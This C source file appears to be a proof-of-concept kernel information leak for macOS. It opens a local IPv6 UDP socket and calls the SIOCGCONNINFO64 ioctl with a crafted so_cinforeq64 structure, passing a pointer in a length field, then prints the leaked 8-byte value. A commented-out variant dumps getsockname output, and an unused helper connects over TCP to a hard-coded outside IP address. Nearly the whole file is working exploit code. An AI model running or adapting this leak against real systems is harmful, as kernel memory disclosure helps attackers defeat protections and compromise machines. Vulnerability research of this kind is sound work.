#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>
#include <net/if.h>
#include <netinet/in_var.h>
#include <netinet6/nd6.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/sockio.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int allocation(){
	int sock;
	struct sockaddr_in6 saddr;

	sock = socket(PF_INET6, SOCK_DGRAM, IPPROTO_UDP);
//	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	if(sock < 0){
		perror("create socket");
	}

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin6_len = sizeof(saddr);
	saddr.sin6_family = PF_INET6;
	saddr.sin6_port = htons(7003);
	inet_pton(PF_INET6, "::1", &saddr.sin6_addr);

	int len = sizeof(saddr);
	if(sendto(sock, "TEST", 4, MSG_WAITALL, (struct sockaddr *) &saddr, sizeof(saddr)) < 0){
		perror("sendto");
	}
/*
	if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0){
		perror("connect");
		exit(0);
	}
*/
/*
	if(sendto(sock, "Hello", 5, 0, NULL, sizeof(saddr)) < 0){
		perror("send");
	}
*/
	return sock;
}

int allocationTCP(){
	int sock;
    struct sockaddr_in saddr;

    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock < 0){
        perror("create socket");
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_len = sizeof(saddr);
    saddr.sin_family = PF_INET;
    saddr.sin_port = htons(7003);
    saddr.sin_addr.s_addr = inet_addr("132.145.210.169");
    int len = sizeof(saddr);
    
	if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0){
        perror("connect");
        exit(0);
    }
	return sock;
}
/*
void leak(int sock){
	size_t len=0x100;
	char *sockname = malloc(0x100);
	memset(sockname, 0, 0x100);
	if(getsockname(sock, (struct sockaddr *)sockname, &len) < 0){
		perror("getsockname");
		exit(0);
	}
	
	printf("Got info:\n");
	for(int i=0; i<0x100/8; i++){
		printf("0x%llx\n", *(size_t *)(sockname+8*i));
	}
	//printf("Got name info %s", sockname);
	struct sockaddr_in my_addr;
	memset(&my_addr, 0, sizeof(my_addr));
	len = sizeof(my_addr);
	if(getsockname(sock, (struct sockaddr *)&my_addr, &len) < 0){
        perror("getsockname");
        exit(0);
    }
	char myIP[16];
	size_t myPort;
	inet_ntop(AF_INET, &my_addr.sin_addr, myIP, sizeof(myIP));
	myPort = ntohs(my_addr.sin_port);
	printf("Local ip address: %s\n", myIP);
}
*/

struct so_cinforeq64 {
    sae_connid_t    scir_cid;
    __uint32_t  scir_flags;
    __uint32_t  scir_ifindex;
    __int32_t   scir_error;
    void*   scir_src    __attribute__((aligned(8)));
    socklen_t   scir_src_len;
    void*   scir_dst    __attribute__((aligned(8)));
    socklen_t   scir_dst_len;
    __uint32_t  scir_aux_type;
    void*   scir_aux_data   __attribute__((aligned(8)));
    __uint32_t  scir_aux_len;
};

#define SIOCGCONNINFO64 _IOWR('s', 152, struct so_cinforeq64)

void leak(int sock){

	size_t len = 0x40;
	struct so_cinforeq64 so_cin;
	so_cin.scir_cid = SAE_CONNID_ALL;
	so_cin.scir_src = malloc(0x40);
	so_cin.scir_src_len = &len;
	so_cin.scir_dst = malloc(0x40);

	memset(so_cin.scir_src, 0, 0x40);
	memset(so_cin.scir_dst, 0, 0x40);

	if(ioctl(sock, /*SIOCGCONNINFO64*/ SIOCGCONNINFO64, &so_cin) < 0){
		perror("ioctl");
	}
	
	printf("Got buffer %llx\n", *(size_t *)so_cin.scir_src);

}

int main(){
	int sock = allocation();
	leak(sock);
}
